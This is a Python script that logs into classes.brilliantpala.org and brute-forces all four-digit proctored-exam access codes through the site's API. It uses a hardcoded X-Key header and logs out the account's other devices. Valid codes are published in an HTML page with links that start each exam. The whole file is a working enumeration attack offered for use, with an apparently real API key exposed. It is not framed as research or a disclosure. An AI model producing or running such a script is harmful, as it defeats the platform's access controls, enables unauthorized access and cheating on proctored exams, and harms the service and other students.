import sys
import requests as r
import threading
import traceback
import datetime
from bs4 import BeautifulSoup as bs
import copy
import time
import os

BASE_URL = "https://classes.brilliantpala.org/"

HEADERS = {
    "User-Agent": f"Mozilla/5.0 (Linux; Android 11; Tab 11 Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/97.0.4692.98 Safari/537.36",
    "Referer": BASE_URL,
    "X-Key": "d77fe6ed65feef09aeb8cd2d7d8a8044e9f1a79ed102f41e487f49e3713b43d2",
}

os.mkdir("build")
os.chdir("./build")
results = []
count = 0


def login(username, password):
    res = r.get(BASE_URL)
    bs_content = bs(res.content, "html.parser")
    csrf = bs_content.find("input", {"name": "csrfmiddlewaretoken"})["value"]

    data = {
        "csrfmiddlewaretoken": csrf,
        "username": str(username),
        "password": str(password),
    }

    res = r.post(
        BASE_URL + "login/?next=",
        data=data,
        headers={"Referer": BASE_URL, "Cookie": "csrftoken=" + csrf},
        allow_redirects=False,
    )
    if res.status_code == 302:
        HEADERS["Cookie"] = (
            "sessionid="
            + res.cookies["sessionid"]
            + "; csrftoken="
            + res.cookies["csrftoken"]
        )

        res = r.get(
            BASE_URL + "logout_devices/?next=/",
            headers=HEADERS,
        )

        bs_content = bs(res.content, "html.parser")
        csrf = bs_content.find("input", {"name": "csrfmiddlewaretoken"})["value"]

        r.post(
            BASE_URL + "logout_devices/?next=/",
            data={"csrfmiddlewaretoken": csrf},
            headers=HEADERS,
        )
        print("Logged in.")
        i = 1000
        p = []
        s = r.Session()
        while i < 10000:
            k = copy.deepcopy(i)
            h = threading.Thread(target=code, args=(k, s), daemon=True)
            p.append(h)
            if len(p) >= 20:
                time.sleep(2)
                p = []
            h.start()
            i += 1
        h.join()
        f = open("index.html", "w+")
        formatted = "\n".join(
            [
                f"""<tr>
                  <td>{code}</td>
                  <td><a href='{BASE_URL}exams/run/{slug}/start/'>{title}</a></td>
                </tr>"""
                for code, title, _, slug in sorted(
                    results, key=lambda x: x[2], reverse=True
                )
            ]
        )
        f.write(
            f"""
<html>
  <head>
    <title>Brilliant Proctored Access Codes</title>
    <style>
      body {{
          background-color: #f0f5ff; /* Light blue background */
          color: #333; /* Dark text color */
          font-family: Arial, sans-serif;
        }}

      h1 {{
        color: #0077cc; /* Blue heading color */
      }}

      table {{
        border: 2px solid #0077cc; /* Blue border for the table */
        width: 80%;
        margin: 20px auto;
        border-collapse: collapse;
      }}

      th, td {{
        border: 1px solid #0077cc; /* Blue border for table cells */
        padding: 10px;
      }}

      hr {{
        border: 1px solid #0077cc; /* Blue border for the horizontal rule */
      }}

      footer {{
        margin-top: 20px;
        text-align: center;
        color: #666; /* Gray text color for the footer */
        font-style: italic;
      }}
    </style>
  </head>
  <body align="center">
    <h1>Brilliant Proctored Exam Access Codes</h1>
    These are all valid access codes to exams which may or may not have started or ended on classes.brilliantpala.org.
    <hr>
    <table>
      <tr>
        <th>Code</th>
        <th>Exam</th>
      </tr>
      {formatted}
    </table>
    <hr>
    <footer>
    Made by <a href="https://github.com/Alpha62579/">Robin.</a> on Brilliant's "locked" study tablet.
    </footer>
  </body>
</html>"""
        )
        f.close()
        res = r.get(
            BASE_URL + "logout",
            headers=HEADERS,
        )
        print("Process complete with", count, "codes found.")
        exit(0)


def code(k, s):
    global count
    try:
        res = s.get(
            BASE_URL + f"api/v2.3/access_codes/{k}/exams/",
            headers=HEADERS,
        )
        if res.status_code == 200:
            result = res.json()["results"][0]
            results.append(
                (
                    k,
                    result["title"],
                    (
                        datetime.datetime.fromisoformat(result["end_date"])
                        if isinstance(result["end_date"], str)
                        else datetime.datetime.fromisoformat(result["start_date"])
                    ),
                    result["slug"],
                )
            )
            count += 1
            print(k, "yay code")
    except Exception:
        print(traceback.format_exc())


login(sys.argv[1], sys.argv[2])
exit(0)
